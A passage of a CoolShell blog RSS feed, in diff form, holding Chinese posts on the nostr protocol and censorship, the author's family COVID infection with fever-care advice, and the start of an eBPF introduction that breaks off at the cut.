。我顺着去看了一下这个协议，发现这个协议真是非常的简单，简单到几句话就可以讲清楚了。</p>
+<h4>通讯过程</h4>
+<ul>
+<li>这个协议中有两个东西，一个是 client，一个是 relay，client 就是用户社交的客户端，relay 就是转发服务器。</li>
+<li>用户不需要注册，用户只需要有一个密钥对（公钥+私钥）就好了，然后把要发的信息做签名，发给一组 relays</li>
+<li>然后你的 Follower 就可以从这些 relays 上订阅到你的信息。</li>
+</ul>
+<p><span id="more-22367"></span></p>
+<h4>技术细节摘要</h4>
+<ul>
+<li>技术实现上，nostr 使用 websocket + JSON 的方式。其中主要是下面这么几个指令
+<ul>
+<li>Client 到 Relay主要是下面这几个指令：
+<ul>
+<li><code>EVENT</code>。发出事件，可以扩展出很多很多的动作来，比如：发信息，删信息，迁移信息，建 Channel ……扩展性很好。</li>
+<li><code>REQ</code>。用于请求事件和订阅更新。收到<code>REQ</code>消息后，relay 会查询其内部数据库并返回与过滤器匹配的事件，然后存储该过滤器，并将其接收的所有未来事件再次发送到同一websocket，直到websocket关闭。</li>
+<li><code>CLOSE</code>。用于停止被 <code>REQ</code> 请求的订阅。</li>
+</ul>
+</li>
+<li>Relay 到 Client 主要是下面几个指令：
+<ul>
+<li><code>EVENT</code>。用于发送客户端请求的事件。</li>
+<li><code>NOTICE</code>。用于向客户端发送人类可读的错误消息或其他信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>关于 <code>EVENT</code> 下面是几个常用的基本事件：
+<ul>
+<li><code>0</code>: <code>set_metadata</code>：比如，用户名，用户头像，用户简介等这样的信息。</li>
+<li><code>1</code>: <code>text_note</code>：用户要发的信息内容</li>
+<li><code>2</code>： <code>recommend_server</code>：用户想要推荐给关注者的Relay的URL（例如<code>wss://somerelay.com</code>）</li>
+</ul>
+</li>
+</ul>
+<h4>如何对抗网络审查</h4>
+<p>那么，这个协议是如何对抗网络审查的？</p>
+<ul>
+<li>识别你的身份是通过你的签名，所以，只要你的私钥还在，你是不会被删号的</li>
+<li>任何人都可以运行一个或多个relay，所以，就很难有人控制所有的relay</li>
+<li>你还可以很方便的告诉其中的 relay 把你发的信息迁到另一个 relay 上</li>
+<li>你的信息是一次发给多个relay的，所以，只要不是所有的热门realy封了你，你就可以发出信息</li>
+<li>每个relay的运营者都可以自己制定规则，会审查哪些类型内容。用户据此选择即可。基本不会有一个全局的规则。</li>
+<li>如果你被全部的relay封了，你还是可以自建你的relay，然后，你可以通过各种方式告诉你身边的人你的relay服务器是什么？这样，他们把这个relay服务器加到他们的client列表中，你又可以从社死中复活了。</li>
+</ul>
+<p>嗯，听起来很简单，整个网络是构建在一种 “社区式”的松散结构，完全可能会出现若干个 relay zone。这种架构就像是互联网的架构，没有中心化，比如 DNS服务器和Email服务器一样，只要你愿意，你完全可以发展出自己圈子里的“私服”。</p>
+<p>其实，电子邮件是很难被封禁和审查的。我记得2003年中国非典的时候，我当时在北京，当时的卫生部部长说已经控制住了，才12个人感染，当局也在控制舆论和删除互联网上所有的真实信息。但是，大家都在用电子邮件传播信息，当时基本没有什么社交软件，大家分享信息都是通过邮件，尤其是外企工作的圈子，当时每天都要收很多的非典的群发邮件，大家还都是用公司的邮件服务器发……这种松散的，点对点的架构，让审查是基本不可能的。其实，<strong>我觉得 nostr 就是另外一个变种或是升级版的 email 的形式</strong>。</p>
+<h4>如何对抗Spam和骗子</h4>
+<p>但是问题来了，如果不能删号封人的话，那么如何对抗那些制造Spam，骗子或是反人类的信息呢？nostr目前的解决方案是通过比特币闪电网络。比如有些客户端实现了如果对方没有follow 你，如果给他发私信，需要支付一点点btc ，或是relay要求你给btc才给你发信息（注：我不认为这是一个好的方法，因为：1）因为少数的坏人让大多数正常人也要跟着付出成本，这是个糟糕的治理方式，2）不鼓励那些生产内容的人，那么平台就没有任何价值了）。</p>
+<p>不过，我觉得也有可以有下面的这些思路：</p>
+<ul>
+<li>用户主动拉黑，但很明显这个效率不高，而且体验不好</li>
+<li>社区或是同盟维护一个黑名单，relay定期更新（如同email中防垃圾邮件也是这样搞的），这其实也是审查。</li>
+<li>防Spam的算法过滤垃圾信息（如同email中干的），自动化审查。</li>
+<li>增加发Spam的成本，如: PoW 工作量证明（比特币的挖矿，最早也是用于Email），发信息要花钱（这个对正常用户伤害太大了）等。</li>
+<li>……</li>
+</ul>
+<p>总之，还是有相应的方法的，但是一定没有完美解，email对抗了这么多年，你还是可以收到大量的垃圾邮件和钓鱼邮件，所以，我觉得 nostr 也不可能做到……</p>
+<h4>怎么理解审查</h4>
+<p>最后，我们要明白的是，<strong>无论你用什么方法，审查是肯定需要的，所以，我觉得要完全干掉审查，最终的结果就是一个到处都垃圾内容的地方！</strong></p>
+<p><strong>我理解的审查不应该是为权力或是个体服务的，而是为大众和人民服务的，所以，审查必然是要有一个开放和共同决策的流程，而不是独断的</strong>。</p>
+<p>这点可以参考开源软件基金会的运作模式。</p>
+<ul>
+<li>最底端的是用户（User）参与开源社区的使用并提供问题和反馈。</li>
+<li>用户在使用过程中了解项目情况后贡献代码和文档就可以晋升为贡献者（Contributors），</li>
+<li>当贡献者提交一定数量贡献之后就可以晋升为提交者（Committers），此时你将拥有你参与仓库的代码读写权限。</li>
+<li>当提交者Committers在社区得到认可后，由项目管理委员会（PMC）选举并产生PMC成员（类似于议员），PMC成员拥有社区相关事务的投票、提名和共同决策权利和义务。</li>
+</ul>
+<p>注意下面几点</p>
+<ul>
+<li>整个社区的决策者，是要通过自己贡献来挣到被选举权的。</li>
+<li>社区所有的工作和决定都是要公开的。</li>
+<li>社区的方向和决策都是要投票的，PMC成员有binding的票权，大众也有non-binding的投票权供参考。</li>
+<li><strong>如果出现了价值观的不同，那么，直接分裂社区就好了，不同价值观的人加入到不同的社区就好了</strong>。</li>
+</ul>
+<p>如果审查是在这个框架下运作的话，虽然不完美，但至少会在一种公允的基础下运作，是透明公开的，也是集体决策的。</p>
+<p>开源软件社区是一个很成功的示范，所以，我觉得只有技术而没有一个良性的可持续运作的社区，是不可能解决问题的，<strong>干净整齐的环境是一定要有人打扫和整理的</strong>。</p>
+<p>&nbsp;</p>
+<figure id="attachment_22371" aria-describedby="caption-attachment-22371" style="width: 300px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-22371 size-medium" src="https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-300x289.jpg" alt="欢迎关注我 npub1w6r99545cxea6z76e8nvzjxnymjt4nrsddld33almtm78z7fz95s3c94nu" width="300" height="289" srcset="https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-300x289.jpg 300w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-1024x987.jpg 1024w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-768x740.jpg 768w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-280x270.jpg 280w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533.jpg 1242w" sizes="(max-width: 300px) 100vw, 300px" /><figcaption id="caption-attachment-22371" class="wp-caption-text">欢迎关注我 npub1w6r99545cxea6z76e8nvzjxnymjt4nrsddld33almtm78z7fz95s3c94nu</figcaption></figure>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png" alt="记一次Kubernetes/Docker网络排障" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a></li><li ><a href="https://coolshell.cn/articles/9859.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/06/Alan-Cox-150x150.jpg" alt="Alan Cox：单向链表中prev指针的妙用" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9859.html" class="wp_rp_title">Alan Cox：单向链表中prev指针的妙用</a></li><li ><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="国内微博和Twitter的最大不同" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a></li><li ><a href="https://coolshell.cn/articles/25.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="如何上网觅无踪" width="150" height="150" /></a><a href="https://coolshell.cn/articles/25.html" class="wp_rp_title">如何上网觅无踪</a></li><li ><a href="https://coolshell.cn/articles/7755.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/git.log_.01-150x150.png" alt="Git显示漂亮日志的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7755.html" class="wp_rp_title">Git显示漂亮日志的小技巧</a></li><li ><a href="https://coolshell.cn/articles/1379.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/13.jpg" alt="如何调试bash脚本" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1379.html" class="wp_rp_title">如何调试bash脚本</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22367.html">聊聊 nostr 和 审查</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22367.html/feed</wfw:commentRss>
+			<slash:comments>12</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>感染新冠的经历</title>
+		<link>https://coolshell.cn/articles/22341.html</link>
+					<comments>https://coolshell.cn/articles/22341.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 13 Dec 2022 07:39:39 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[covid19]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22341</guid>
+
+					<description><![CDATA[<p>写一篇与技术无关的文章，供大家参考。我住北京朝阳，从上周三开始我家一家三口陆续发烧生病，自测抗原后，都是阳性。好消息是，这个奥密克戎跟一般的病毒性感冒差不多，没...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22341.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22341.html">感染新冠的经历</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium wp-image-22346" src="https://coolshell.cn/wp-content/uploads/2022/12/covid19-300x225.jpg" alt="" width="300" height="225" srcset="https://coolshell.cn/wp-content/uploads/2022/12/covid19-300x225.jpg 300w, https://coolshell.cn/wp-content/uploads/2022/12/covid19-768x576.jpg 768w, https://coolshell.cn/wp-content/uploads/2022/12/covid19-360x270.jpg 360w, https://coolshell.cn/wp-content/uploads/2022/12/covid19.jpg 800w" sizes="(max-width: 300px) 100vw, 300px" />写一篇与技术无关的文章，供大家参考。我住北京朝阳，从上周三开始我家一家三口陆续发烧生病，自测抗原后，都是阳性。好消息是，这个奥密克戎跟一般的病毒性感冒差不多，没什么可怕的，不过，整个过程除了发病之外还有一些别的因为感染带出来的事，大家也需要知晓，以准备好，以免造成生活的不便，更好的照顾好自己和家人。</p>
+<h4>整个过程</h4>
+<p>我先说一下整个过程（我会不断更新这个过程，直到转阴）。说明一下，<strong>我孩子老婆都打过三针国产疫苗，孩子是科兴，老婆是北京生物，我完全没有打</strong>。</p>
+<p>先是我家孩子（12 岁）。上周三（12 月 7 日），孩子早上起来就说头疼，一测体温，38 度 5，就停止上网课，老实休息了，我们并没给孩子吃什么药，到了晚上，孩子的体温到了 39.4，嗓子疼，我老婆用酒精给孩子物理降温（注：事实上最好别用酒精，因为会被皮肤吸收导致副作用），成功降到了 38.2 左右。周四（12 月 8 日），孩子的体温在 38.2 一天，我老婆给孩子吃了莲花清瘟，被我制止了，本来想上退烧药的，但是我想体温也不算高，能不吃就不吃，于是就让孩子冲了个复方感冒冲剂（其实里面含对乙酰氨基酚，后面会说）。周五（12 月 9 日），孩子不停地出汗，到下午体温正常了，然后咳嗽，鼻涕就来了，感冒症状来了，但精神不好，体虚无力。周末休息两天就基本没事了，也转阴了。</p>
+<p>接下来就到我了。</p>
+<p><span id="more-22341"></span></p>
+<p>周五那天感觉嗓子有点异样，我没怎么在意，周六（12 月 10）就开始发烧了，傍晚 18 点左右，我是手脚冰冷，还有点打冷颤，头晕，嗓子干燥，我就钻被子里了，在半睡不睡的状态下到了 20 点左右，我浑身发烫，我老婆过来给我一量体温，39.8，说要不要也抹点酒精？我想，北京这个季节，物理降温不就上阳台上站一会就好了吗？当然，我就是把窗开了个口，把室温降到 20 度左右，然后，短袖短裤呆了一会就感到清醒了一些。这个时候，我觉得再来碗热汤就好了，我喝不习惯生姜红糖水，又腥又甜，我就自己整了一小锅西红柿蛋花汤，为了让我更能出汗，并适合我的重口味，我又加了点辣椒，一小锅热汤下肚，汗出的不亦乐乎，体温降低到38.4度，我觉的不用再吃药了，当然，嗓子也疼了。但是我舒服了很多，最后还看了下摩洛哥是怎么把C罗送回家的比赛。</p>
+<p>周日（12 月 11）是我最难受的一天，全天体温在 38.2左右，从早上就没有精神，吃完早点后，从 10 点一直睡到下午 15 点（因为嗓子疼，所以睡的也不安宁，各种难受）， 这天我一会儿就出次汗，但是体温降不下来，始终在 38.2，然后我在犹豫是不是吃布洛芬，但是我感觉体温也不是很高，布洛芬这种药能不吃不不吃。然后，睡前喝了一袋感冒冲剂。周日这天，我婆也发烧，38.5，她全身疼痛，包括嗓子。这一天，我们在家啥也干不了，全家都在床上躲着，只有孩子还能动，所以，有些事只能让孩子去干了，我们也只点外卖了。</p>
+<p>周一（12 月 12 日）我早上起来，38.5，开完周会后，看很多人说泰诺有用，然后翻了一下家，居然没找到，算，还是冲两包感冒冲剂得了（后来才知道，中成药里也都是掺了对乙酰氨基酚，看来中医对自己都没什么信心），于是整个下午就在出汗了，我一整天都没有什么食欲，到了下午 17 点左右，体温正常了 36.7，但是晚上又到了 37 度，开始咳痰，轻微流鼻涕，不过感觉没什么事了。而我老婆的烧居然退了，她说她应该好了。</p>
+<figure id="attachment_22343" aria-describedby="caption-attachment-22343" style="width: 400px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399.jpg"><img decoding="async" loading="lazy" class="wp-image-22343" src="https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-871x1024.jpg" alt="" width="400" height="471" srcset="https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-871x1024.jpg 871w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-255x300.jpg 255w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-768x903.jpg 768w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-230x270.jpg 230w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399.jpg 1123w" sizes="(max-width: 400px) 100vw, 400px" /></a><figcaption id="caption-attachment-22343" class="wp-caption-text">这就是我吃的感冒冲剂。注：为什么 还要整点咖啡因，说明书上说，怕对乙酰氨基酚造成嗜睡，所以用咖啡因来消解，这复方逻辑，毫无破绽啊</figcaption></figure>
+<p>周二（12 月 13 日）我早上起床后， 体温还是在 37.2 度，我的嗓子干燥微疼，头也不疼就是头晕，所以，今天睡了两次，一次是中午12 点半到下午 14点半，一次是 16：40 到 19:10，两次都出汗了，而且第二觉睡地太爽了，感觉是这两天睡过最高质量高的觉，而且嗓子不干了也好了，体温正常了 36.8，但是感冒症状出来了，接下来几天休息一下应该就好了。我孩子应该感冒也没有精神，所以一天来也是醒醒睡睡。而我老婆又开始发烧了，还带这样的，跳跃性发烧…… 更不好的是她嗓子已经疼到说不出话，也咽不下东西了，今天她也是床上躺了一天……</p>
+<p>周三（12月14日）我今天已经不发烧了，就是频率不高的咳嗽，轻微鼻塞，不过，还是要休息，喝水。我老婆体温还是低烧中，嗓子疼痛好了些，感觉正在恢复中……</p>
+<p><strong>整个过程，对我和我孩子来说，不难受，感觉就是发3天烧睡3天，再休息 3 天的样子，嗓子干燥微疼，比以前的病毒性感冒好多了，以前的病毒性感冒导致的嗓子疼我是连咽口水都咽不下去。但是对于我老婆就不一样了，她先是浑身疼痛，嗓子干燥，到现在嗓子疼如刀割，说不出话。这个事可能也因人而异。</strong></p>
+<p>继续更新，自我阳性以来半个月了，从 12 月 14 日退烧后，我就一直处在感冒和低频咳嗽中，直到12 月 27 日才发现不咳嗽也不感冒了，但是说话还是有一点鼻音，估计还要 5-7 天就可以完全恢复了。</p>
+<h4>注意事项</h4>
+<p><img decoding="async" loading="lazy" class="wp-image-22344 alignright" src="https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402.jpg" alt="" width="293" height="390" srcset="https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402.jpg 500w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402-225x300.jpg 225w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402-203x270.jpg 203w" sizes="(max-width: 293px) 100vw, 293px" /></p>
+<p>能物理降温就不要吃药来降（<strong>应该避免使用酒精擦拭，因为有副作用，用水或冰就可以了</strong>），降到 38.5 以下，就可以自己抗了。如果物理降温不奏效，就要吃布洛芬和泰诺(林)，这两种药非常有帮助，但是你应该在药店里买不到了，所以，你可以买中成药或复方药，反正里面的中药没有用，而几乎所有的中成药里都被加入了“对乙酰氨基酚”，算是“间接”或“复方”泰诺(林)了。但是，不要多服，不然，药量叠加，会导致你肝肾中毒。参看《<a href="https://www.163.com/dy/article/HOA1A9UQ055342ZM.html" target="_blank" rel="noopener">这些所谓“中成药”，关键原料是对乙酰氨基酚，服用小心叠加过量</a>》</p>
+<p>下面文字节选自“默沙东诊疗手册”</p>
+<blockquote>
+<div class="para">
+<p>最有效和最广泛使用的退热药为对乙酰氨基酚和非甾体抗炎药 (NSAID)，如阿司匹林、布洛芬和萘普生。</p>
+</div>
+<div class="para">
+<p>通常，人们可能采取以下方式之一：</p>
+</div>
+<div class="list">
+<ul class="bulleted" data-mmanualobjecttype="List">
+<li class="topic__listitem"><span id="v27742687_zh" class="anchor"></span>
+<div class="para">
+<p>每6小时650毫克对乙酰氨基酚（1天内不超过4000毫克）</p>
+</div>
+</li>
+<li class="topic__listitem"><span id="v27742689_zh" class="anchor"></span>
+<div class="para">
+<p>每6小时200到400毫克布洛芬</p>
+</div>
+</li>
+</ul>
+</div>
+<div class="para">
+<p>因为许多非处方感冒药或流感制剂含有对乙酰氨基酚，人们一定要注意不要在同一时间服用对乙酰氨基酚和一种或多种这些制剂。</p>
+</div>
+<div class="para">
+<p>只有当温度达到106°F (41.1°C)左右或更高时，才需要采取其它降温措施（如用温水喷雾和降温毯降温）。避免使用酒精擦拭，因为酒精可被皮肤吸收，可能产生有害效果。</p>
+</div>
+<div class="para">
+<p>有血液感染或生命体征异常（例如，血压低、脉搏和呼吸速度加快）的人需入院。</p>
+</div>
+</blockquote>
+<p>另外，一定要多喝水，热水最好。多喝水的原因是：1）布洛芬、对乙酰氨基酚（扑热息痛）等退烧药会让人加速出汗，会导致脱水。2）布洛芬等退烧药主要在肝脏代谢，60%~90%经肾脏随尿排出。多喝水，可加速药物排出体外，减少退烧药对肝肾的损伤。3）排汗和排尿都会帮身体带走一些热量。</p>
+<p>具体喝多少水因人而异，一般在2.5升到4升间，主要看你上厕所的频率。我因为前三天都在出汗，所以怎么喝水都不怎么上厕所，这两天我大概一天喝4升左右。总之，发烧吃退烧药更要多喝水。</p>
+<p>另外，如果全家都病倒了，那生活就有点不方便了，所以，你得做好一些准备：</p>
+<p>1）事先订好桶装水，18L 的那种，让人可以给家里送水，发烧期间用水很快的。</p>
+<p>2）生活上的事要做好全家病倒的准备，做饭只能整方便的做的或是速食的了，家里存点牛奶，面包，麦片，火腿肠，水果什么的，保证营养。再不行就点外卖，我家已经点了三天的外卖。还让孩子当个配送员跑腿到菜市场和超市开着视频买东西……</p>
+<p>3）还是要提前备药，我是准备用药的时候，发现家里只找到了布洛芬和感冒冲剂，因为我有高血脂，我还要吃瑞舒伐他汀钙片，结果发现我周边 5 公里的药店基本全都休业了，估计店员都阳了。</p>
+<p>4）有老人的，要照顾好。有呼吸困难的，一定要送急诊。</p>
+<p>根据知乎上的这个<a href="https://zhuanlan.zhihu.com/p/590989182" target="_blank" rel="noopener">通过搜索引擎的测算</a>，第一波的结束大约会在明年春节前结束。最后祝大家好运。</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/6335.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/01/图片1-150x150.png" alt="Resin服务器getResource揭秘" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6335.html" class="wp_rp_title">Resin服务器getResource揭秘</a></li><li ><a href="https://coolshell.cn/articles/10217.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/Work-Overtime-150x150.jpg" alt="加班与效率" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10217.html" class="wp_rp_title">加班与效率</a></li><li ><a href="https://coolshell.cn/articles/5035.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/17.jpg" alt="面向对象的Shell脚本" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5035.html" class="wp_rp_title">面向对象的Shell脚本</a></li><li ><a href="https://coolshell.cn/articles/1192.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/10.jpg" alt="一些单元测试的Guideline" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1192.html" class="wp_rp_title">一些单元测试的Guideline</a></li><li ><a href="https://coolshell.cn/articles/17061.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2015/08/docker-filesystems-busyboxrw-150x150.png" alt="Docker基础技术：AUFS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17061.html" class="wp_rp_title">Docker基础技术：AUFS</a></li><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22341.html">感染新冠的经历</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22341.html/feed</wfw:commentRss>
+			<slash:comments>23</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>eBPF 介绍</title>
+		<link>https://coolshell.cn/articles/22320.html</link>
+					<comments>https://coolshell.cn/articles/22320.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sat, 10 Dec 2022 02:38:51 +0000</pubDate>
+				<category><![CDATA[C/C++语言]]></category>
+		<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[操作系统]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[Debug]]></category>
+		<category><![CDATA[eBPF]]></category>
+		<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22320</guid>
+
+					<description><![CDATA[<p>很早前就想写一篇关于eBPF的文章，但是迟迟没有动手，这两天有点时间，所以就来写一篇，这文章主要还是简单的介绍eBPF 是用来干什么的，并通过几个示例来介绍是怎...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22320.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22320.html">eBPF 介绍</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright wp-image-22329 size-full" src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.jpeg" alt="" width="301" height="167" />很早前就想写一篇关于eBPF的文章，但是迟迟没有动手，这两天有点时间，所以就来写一篇，这文章主要还是简单的介绍eBPF 是用来干什么的，并通过几个示例来介绍是怎么玩的，这个技术非常非常之强，Linux 操作系统的观测性实在是太强大了，并在 BCC 加持下变得一览无余。这个技术不是一般的运维人员或是系统管理员可以驾驭的，这个还是要有底层系统知识并有一定开发能力的技术人员才能驾驭的了的。<strong>我在这篇文章的最后给了个彩蛋。</strong></p>
+<h4>介绍</h4>
+<p>eBPF（extened Berkeley Packet Filter）是一种内核技术，它允许开发人员在不修改内核代码的情况下运行特定的功能。eBPF 的概念源自于 Berkeley Packet Filter（BPF），后者是由贝尔实验室开发的一种网络过滤器，可以捕获和过滤网络数据包。</p>
+<p>出于对更好的 Linux 跟踪工具的需求，eBPF 从 <a href="https://illumos.org/books/dtrace/chp-intro.html">dtrace</a>中汲取灵感，dtrace 是一种主要用于 Solaris 和 BSD 操作系统的动态跟踪工具。与 dtrace 不同，Linux 无法全面了解正在运行的系统，因为它仅限于系统调用、库调用和函数的特定框架。<a href="https://www.kernel.org/doc/html/latest/bpf/index.html">在Berkeley Packet Filter</a>  (BPF)（一种使用内核 VM 编写打包过滤代码的工具）的基础上，一小群工程师开始扩展 BPF 后端以提供与 dtrace 类似的功能集。 eBPF 诞生了。<strong>2014 年随 Linux 3.18 首次限量发布，充分利用 eBPF 至少需要 Linux 4.4 以上版本</strong>。</p>
+<p><span id="more-22320"></span></p>
+<p>eBPF 比起传统的 BPF 来说，传统的 BPF 只能用于网络过滤，而 eBPF 则可以用于更多的应用场景，包括网络监控、安全过滤和性能分析等。另外，eBPF 允许常规用户空间应用程序将要在 Linux 内核中执行的逻辑打包为字节码，当某些事件（称为挂钩）发生时，内核会调用 eBPF 程序。此类挂钩的示例包括系统调用、网络事件等。用于编写和调试 eBPF 程序的最流行的工具链称为 <a href="https://github.com/iovisor/bcc">BPF 编译器集合</a> (BCC)，它基于 LLVM 和 CLang。</p>
+<p>eBPF 有一些类似的工具。例如，SystemTap 是一种开源工具，可以帮助用户收集 Linux 内核的运行时数据。它通过动态加载内核模块来实现这一功能，类似于 eBPF。另外，DTrace 是一种动态跟踪和分析工具，可以用于收集系统的运行时数据，类似于 eBPF 和 SystemTap。<code>[1]</code></p>
+<p>以下是一个简单的比较表格，可以帮助您更好地了解 eBPF、SystemTap 和 DTrace 这三种工具的不同之处：<code>[1]</code></p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>eBPF</th>
+<th>SystemTap</th>
+<th>DTrace</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>定位</td>
+<td>内核技术，可用于多种应用场景</td>
+<td>内核模块</td>
+<td>动态跟踪和分析工具</td>
+</tr>
+<tr>
+<td>工作原理</td>
+<td>动态加载和执行无损编译过的代码</td>
+<td>动态加载内核模块</td>
+<td>动态插接分析器，通过 probe 获取数据并进行分析</td>
+</tr>
+<tr>
+<td>常见用途</td>
+<td>网络监控、安全过滤、性能分析等</td>
+<td>系统性能分析、故障诊断等</td>
+<td>系统性能分析、故障诊断等</td>
+</tr>
+<tr>
+<td>优点</td>
+<td>灵活、安全、可用于多种应用场景</td>
+<td>功能强大、可视化界面</td>
+<td>功能强大、高性能、支持多种编程语言</td>
+</tr>
+<tr>
+<td>缺点</td>
+<td>学习曲线高，安全性依赖于编译器的正确性</td>
+<td>学习曲线高，安全性依赖于内核模块的正确性</td>
+<td>配置复杂，对系统性能影响较大</td>
+</tr>
+</tbody>
+</table>
+<p style="text-align: center;">对比表格<code>[1]</code></p>
+<p>从上表可以看出，eBPF、SystemTap 和 DTrace 都是非常强大的工具，可以用于收集和分析系统的运行情况。<code>[1]</code></p>
+<h4>用途</h4>
